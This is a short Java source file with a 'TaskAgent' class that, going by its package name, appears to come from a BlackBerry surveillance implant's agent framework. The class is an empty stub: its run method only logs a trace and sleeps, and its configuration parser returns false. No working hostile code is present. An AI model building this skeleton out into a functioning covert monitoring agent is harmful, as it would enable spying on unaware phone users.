package com.ht.rcs.blackberry.agent;

import com.ht.rcs.blackberry.utils.Debug;
import com.ht.rcs.blackberry.utils.DebugLevel;

public class TaskAgent extends Agent {
	//#debug
    static Debug debug = new Debug("TaskAgent", DebugLevel.VERBOSE);

    public TaskAgent(boolean agentStatus) {
        super(Agent.AGENT_TASK, agentStatus, true, "TaskAgent");

    }

    protected TaskAgent(boolean agentStatus, byte[] confParams) {
        this(agentStatus);
        parse(confParams);
    }

    public void actualRun() {
        // #debug
        debug.trace("run");

        this.sleepUntilStopped();

    }

    protected boolean parse(byte[] confParameters) {
        // TODO Auto-generated method stub
        return false;
    }
}
